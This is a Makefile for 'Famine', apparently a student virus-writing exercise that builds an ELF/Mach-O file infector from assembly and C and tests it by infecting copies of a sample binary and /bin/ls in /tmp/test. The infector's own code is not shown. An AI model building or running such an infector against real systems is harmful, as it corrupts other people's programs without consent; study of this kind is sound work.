#******************************************************************************#
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: gbourgeo <marvin@42.fr>                    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2018/05/20 19:57:53 by gbourgeo          #+#    #+#              #
#    Updated: 2018/06/01 11:35:53 by root             ###   ########.fr        #
#                                                                              #
#******************************************************************************#

NAME	= Famine

SRC_DIR	= srcs/
SRC		= main.c

ELF_DIR	= $(SRC_DIR)elf/
MAC_DIR	= $(SRC_DIR)macho/

OBJ_DIR	=	obj/
OBJ		= $(addprefix $(OBJ_DIR), $(SRC:.c=.o))
OBJ_S	= $(addprefix $(OBJ_DIR), $(SRC_S:.s=.o))

UNAME_S	:= $(shell uname -s)
UNAME_P := $(shell uname -p)
ifeq ($(UNAME_S), Linux)
SRC_S		= famine64.s
ASM			= nasm
ASMFLAG		= -f elf64
PRINT_HEX	= $(WWW) -o hex $(ELF_DIR)elf_file_info.c $(INCLUDE) $(LIBS)
endif
ifeq ($(UNAME_S), Darwin)
SRC			+= get_macho.c pack_macho64.c ft_swap_bytes.c
SRC_S		= famine64.s
ASM			= ~/Downloads/nasm-2.11.02/nasm
ASMFLAG		= -f macho64
PRINT_HEX	= $(WWW) -o hex $(MAC_DIR)macho_file_info.c $(INCLUDE) $(LIBS)
endif

WWW		= gcc
FLAGS	= -Wall -Werror -Wextra
LIBS	= -L $(LIB_DIR) -lft
LIB_DIR	= libft/
INCLUDE	= -I includes -I $(LIB_DIR)/includes

all: $(OBJ_DIR) $(NAME)

$(OBJ_DIR):
	@mkdir -p $@
	@make -C $(LIB_DIR)

$(NAME): $(OBJ) $(OBJ_S)
	$(WWW) -o $@ $^ $(LIBS)
	$(PRINT_HEX)

$(OBJ_DIR)%.o: $(SRC_DIR)%.c
	$(WWW) $(FLAGS) -o $@ -c $< $(INCLUDE)

ifeq ($(UNAME_S), Linux)
$(OBJ_DIR)%.o: $(ELF_DIR)%.c
	$(WWW) $(FLAGS) -o $@ -c $< $(INCLUDE)

$(OBJ_DIR)%.o: $(ELF_DIR)%.s
	$(ASM) $(ASMFLAG) -o $@ $<
endif

ifeq ($(UNAME_S), Darwin)
$(OBJ_DIR)%.o: $(MAC_DIR)%.c
	$(WWW) $(FLAGS) -o $@ -c $< $(INCLUDE)

$(OBJ_DIR)%.o: $(MAC_DIR)%.s
	$(ASM) $(ASMFLAG) -o $@ $<
endif

clean:
#	@make -C $(LIB_DIR) clean
	@/bin/rm -rf $(OBJ_DIR)
	@echo $(NAME) objects cleaned...

fclean: clean
#	@make -C $(LIB_DIR) fclean
	@/bin/rm -f $(NAME)
	@/bin/rm -f hex
	@echo $(NAME) erased...

re: fclean all

test: re
	mkdir -p /tmp/test
	cp Ressources/elf64 /tmp/test/elf64
	cp /bin/ls /tmp/test/ls
	./$(NAME)
#/tmp/test/elf64 is now infected
	/tmp/test/elf64
#/tmp/test/elf64 and /tmp/test/ls are not re-infected
